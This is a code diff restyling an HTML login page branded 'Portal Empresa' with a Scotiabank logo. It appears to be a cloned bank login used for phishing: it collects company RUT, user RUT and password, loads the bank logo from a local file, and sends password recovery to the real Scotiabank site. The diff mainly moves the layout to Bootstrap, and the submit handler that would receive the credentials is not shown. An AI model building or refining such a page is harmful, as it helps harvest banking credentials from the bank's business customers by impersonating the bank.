@@ -3,88 +3,33 @@
 <head>
   <meta charset="UTF-8">
   <title>Portal Empresa</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <!-- Bootstrap 5 -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
   <style>
     body {
-      font-family: Arial, sans-serif;
-      margin: 0;
       background: #f4f4f4;
     }
-
-    /* Franja superior fija */
     .top-bar {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
       background: #d32f2f;
       color: #fff;
-      display: flex;
-      justify-content: center; /* centrado en móvil */
-      align-items: center;
-      padding: 0.5rem 1rem;
       box-shadow: 0 2px 5px rgba(0,0,0,0.2);
-      z-index: 1000;
     }
     .top-bar img {
       height: 40px;
     }
-
-    /* Contenedor principal */
-    .main-container {
-      margin-top: 70px; /* espacio para la franja fija */
-      display: flex;
-      flex-direction: column; /* móvil: apilado */
-      align-items: center;
-      padding: 1rem;
-    }
-
-    .form-side {
+    .form-card {
       background: #fff;
       padding: 2rem;
       border-radius: 8px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      width: 100%;
-      max-width: 400px;
-      margin-bottom: 1rem;
     }
-    .form-side h2 {
-      color: #d32f2f;
-      text-align: center;
-      margin-bottom: 1.5rem;
-    }
-    .form-group {
-      margin-bottom: 1rem;
-    }
-    .form-group label {
-      display: block;
-      margin-bottom: 0.5rem;
-      font-weight: bold;
-      color: #333;
-    }
-    .form-group input {
-      width: 100%;
-      padding: 0.5rem;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-    }
-    .btn {
-      width: 100%;
-      padding: 0.75rem;
-      background: #d32f2f;
-      color: #fff;
+    .btn-primary {
+      background-color: #d32f2f;
       border: none;
-      border-radius: 4px;
-      cursor: pointer;
-      font-size: 1rem;
-      margin-top: 1rem;
     }
-    .btn:hover {
-      background: #b71c1c;
-    }
-    .extra-link {
-      text-align: center;
-      margin-top: 0.8rem;
+    .btn-primary:hover {
+      background-color: #b71c1c;
     }
     .extra-link a {
       color: #d32f2f;
@@ -94,66 +39,59 @@
     .extra-link a:hover {
       text-decoration: underline;
     }
-
-    .image-side img {
-      max-width: 100%;
-      height: auto;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-
-    /* Versión escritorio: formulario e imagen lado a lado */
-    @media (min-width: 768px) {
-      .main-container {
-        flex-direction: row;
-        justify-content: center;
-        align-items: flex-start;
-      }
-      .form-side {
-        margin-right: 2rem;
-      }
-    }
   </style>
 </head>
 <body>
   <!-- Franja superior -->
-  <div class="top-bar">
-    <img src="main/ScotiaLogo.svg" alt="Logo Empresa">
-  </div>
+  <nav class="top-bar navbar navbar-expand-lg fixed-top">
+    <div class="container-fluid justify-content-center">
+      <a class="navbar-brand text-white d-flex align-items-center" href="#">
+        <img src="main/ScotiaLogo.svg" alt="Logo Empresa" class="me-2">
+      </a>
+    </div>
+  </nav>
 
   <!-- Contenido principal -->
-  <div class="main-container">
-    <!-- Formulario -->
-    <div class="form-side">
-      <h2>Portal Empresa</h2>
-      <form id="loginForm">
-        <div class="form-group">
-          <label for="rutEmpresa">RUT Empresa</label>
-          <input type="text" id="rutEmpresa" name="rutEmpresa" placeholder="12.345.678-9" required>
+  <div class="container mt-5 pt-5">
+    <div class="row align-items-center">
+      <!-- Formulario -->
+      <div class="col-12 col-md-6 mb-4">
+        <div class="form-card">
+          <h2 class="text-center fw-bold mb-2">Bienvenido a su Portal Empresa</h2>
+          <p class="text-center mb-4">Acceda al portal ingresando sus datos</p>
+          <form id="loginForm">
+            <div class="mb-3">
+              <label for="rutEmpresa" class="form-label">RUT Empresa</label>
+              <input type="text" class="form-control" id="rutEmpresa" name="rutEmpresa" placeholder="12.345.678-9" required>
+            </div>
+            <div class="mb-3">
+              <label for="rutPersona" class="form-label">RUT Usuario</label>
+              <input type="text" class="form-control" id="rutPersona" name="rutPersona" placeholder="98.765.432-1" required>
+            </div>
+            <div class="mb-3">
+              <label for="passwd" class="form-label">Clave</label>
+              <input type="password" class="form-control" id="passwd" name="passwd" placeholder="********" required>
+            </div>
+            <button type="submit" class="btn btn-primary w-100">Ingresar</button>
+          </form>
+          <div class="extra-link text-center mt-3">
+            <a href="https://banco.scotiabank.cl/mfe-login/scotia?c=-Jm7twBoTk8r5JxsG9yQxvyBzYuj9zPzbqKzZGvVa5vWeXygMBZdA_6hy2MsHa_iNlH3e119igob0K7rFv4Y78Ed8U06fo1G887umLNUOM4#modal-recovery" target="_blank">
+              Olvidó su clave / No tiene clave?
+            </a>
+          </div>
+          <div class="message text-center mt-2" id="message"></div>
         </div>
-        <div class="form-group">
-          <label for="rutPersona">RUT Usuario</label>
-          <input type="text" id="rutPersona" name="rutPersona" placeholder="98.765.432-1" required>
-        </div>
-        <div class="form-group">
-          <label for="passwd">Clave</label>
-          <input type="password" id="passwd" name="passwd" placeholder="********" required>
-        </div>
-        <button type="submit" class="btn">Ingresar</button>
-      </form>
-      <div class="extra-link">
-        <a href="https://banco.scotiabank.cl/mfe-login/scotia?c=-Jm7twBoTk8r5JxsG9yQxvyBzYuj9zPzbqKzZGvVa5vWeXygMBZdA_6hy2MsHa_iNlH3e119igob0K7rFv4Y78Ed8U06fo1G887umLNUOM4#modal-recovery" target="_blank">
-          Olvidó su clave / No tiene clave?
-        </a>
       </div>
-      <div class="message" id="message"></div>
-    </div>
 
-    <!-- Imagen aviso -->
-    <div class="image-side">
-      <img src="aviso-ggee.jpg" alt="Aviso Empresa">
+      <!-- Imagen -->
+      <div class="col-12 col-md-6 text-center">
+        <img src="aviso-ggee.jpg" alt="Aviso Empresa" class="img-fluid rounded shadow">
+      </div>
     </div>
   </div>
+
+  <!-- Bootstrap JS -->
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
 
   <script>
     document.getElementById('loginForm').addEventListener('submit', async (e) => {
@@ -174,3 +112,4 @@
   </script>
 </body>
 </html>
+
